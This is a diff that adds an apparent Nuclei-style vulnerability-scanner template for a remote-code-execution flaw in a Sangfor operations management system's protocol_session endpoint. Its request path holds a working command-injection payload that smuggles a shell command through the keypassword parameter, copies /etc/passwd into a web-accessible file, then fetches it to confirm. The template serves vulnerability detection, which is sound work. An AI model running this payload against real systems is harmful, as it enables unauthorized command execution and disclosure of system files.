@@ -1,0 +1,46 @@
+id: poc-yaml-sangfor-omsms-protocol-session-rce
+info:
+  name: Sangfor OMSMS protocol_session Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Sangfor Operations Management Security Management System protocol_session endpoint is vulnerable to remote code execution.
+
+variables:
+  t1: "{{rand_base(6)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "initial-request"
+    method: GET
+    path:
+      - "/isomp-protocol/protocol/session?keyPath=/etc/passwd&protocol=ssh&keypassword=123456%27%3Bcat%20/etc/passwd+%3E%20/usr/local/tomcat/webapps/fort/trust/version/{{t1}}.txt;&sshd=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "[0-9a-fA-F]{8}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{12}"
+
+  - id: "verification-request"
+    method: GET
+    path:
+      - "/fort/trust/version/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
